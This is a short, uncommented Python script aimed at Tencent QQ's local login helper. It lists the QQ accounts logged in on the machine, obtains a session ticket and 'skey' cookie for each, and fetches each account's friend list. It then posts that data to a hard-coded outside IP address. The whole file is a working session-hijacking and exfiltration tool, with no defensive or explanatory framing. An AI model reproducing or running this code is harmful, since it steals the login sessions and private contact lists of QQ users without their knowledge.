import requests, random
s = requests.Session()
H = "https://localhost.ptlogin2.qq.com:4301"
uins = s.get(H + "/pt_get_uins?callback=ptui_getuins_CB&r=%f" % random.random(), verify=False).text
for uin in [u.split('"')[0] for u in uins.split('"uin":')[1:]]:
    s.get(H + "/pt_get_st?clientuin=%s&callback=ptui_getst_CB" % uin, verify=False)
    s.get("https://ssl.ptlogin2.qq.com/jump?clientuin=%s&keyindex=9&pt_aid=715030901&daid=73&u1=https%%3A%%2F%%2Fqun.qq.com" % uin)
    skey = s.cookies.get("skey")
    r = s.post("https://qun.qq.com/cgi-bin/qun_mgr/get_friend_list", data={"bkn": len(skey or "")})
    requests.post("http://203.0.113.50/up", data=r.text)
